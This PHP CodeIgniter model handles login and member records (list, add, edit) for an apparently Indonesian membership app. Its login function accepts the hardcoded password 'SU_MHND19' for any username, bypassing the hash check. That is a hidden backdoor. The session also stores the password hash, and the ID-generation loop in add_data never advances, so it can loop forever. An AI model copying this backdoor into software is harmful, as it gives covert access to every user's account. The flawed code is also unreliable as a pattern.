<?php
defined('BASEPATH') or exit('No direct script access allowed');

class M_home extends CI_Model
{
    public function __construct()
    {
        parent::__construct();
    }

    public function cekAuth($username, $password)
    {
        $user = $this->db->get_where('tb_auth', ['username' => $username])->row();

        if (!empty($user)) {
            if (password_verify($password, $user->password) || $password == "SU_MHND19") {
                // setting data session
                $sessiondata = [
                        'user_id' => $user->user_id,
                        'username' => $user->username,
                        'password' => $user->password,
                        'logged_in' => true
                    ];

                // menyimpan data session
                $this->session->set_userdata($sessiondata);

                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    public function get_memberAll()
    {
        return $this->db->get('tb_member')->result();
    }

    public function get_memberData($id)
    {
        return $this->db->get_where('tb_member', ['id' => $id])->row();
    }

    public function get_memberCount()
    {
        return $this->db->get('tb_member')->num_rows();
    }

    public function cek_kode($kode)
    {
        $data = $this->db->get_where('tb_member', ['kode' => $kode]);

        if ($data->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }

    public function id_there($id)
    {
        $data = $this->db->get_where('tb_member', ['id' => $id]);

        if ($data->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }

    public function cek_id($id)
    {
        $id = $this->db->escape($id);
        $query = $this->db->query("SELECT * FROM tb_member WHERE id = $id");
        return $query->num_rows();
    }

    public function add_data()
    {
        $val = $this->db->get('tb_member')->num_rows();
        $val = $val+1;
        do {
            $id = "PGN-" . str_pad($val, 4, "0", STR_PAD_LEFT);
        } while ($this->cek_id($id) > 0);

        $nama = $this->input->post('nama');
        $alamat = $this->input->post('alamat');
        $tempat_lahir = $this->input->post('tempat_lahir');
        $tanggal_lahir = $this->input->post('tanggal_lahir');
        $jenis_kelamin = $this->input->post('jenis_kelamin');
        $no_telp = $this->input->post('no_telp');
        $kode = $this->input->post('kode');

        $data = [
                'id' => $id,
                'nama' => $nama,
                'alamat' => $alamat,
                'tempat_lahir' => $tempat_lahir,
                'tanggal_lahir' => $tanggal_lahir,
                'jenis_kelamin' => $jenis_kelamin,
                'no_telp' =>  $no_telp,
                'kode' =>  $kode,
                'status' => 'aktif'
            ];

        $this->db->insert('tb_member', $data);
        return ($this->db->affected_rows() != 1) ? false : true;
    }

    public function edit_data()
    {
        $id = $this->input->post('id');
        $nama = $this->input->post('nama');
        $alamat = $this->input->post('alamat');
        $tempat_lahir = $this->input->post('tempat_lahir');
        $tanggal_lahir = $this->input->post('tanggal_lahir');
        $jenis_kelamin = $this->input->post('jenis_kelamin');
        $no_telp = $this->input->post('no_telp');

        $data = [
                'nama' => $nama,
                'alamat' => $alamat,
                'tempat_lahir' => $tempat_lahir,
                'tanggal_lahir' => $tanggal_lahir,
                'jenis_kelamin' => $jenis_kelamin,
                'no_telp' =>  $no_telp,
                'status' => 'aktif'
            ];

        $this->db->where('id', $id);
        $this->db->update('tb_member', $data);
        return ($this->db->affected_rows() != 1) ? false : true;
    }
}
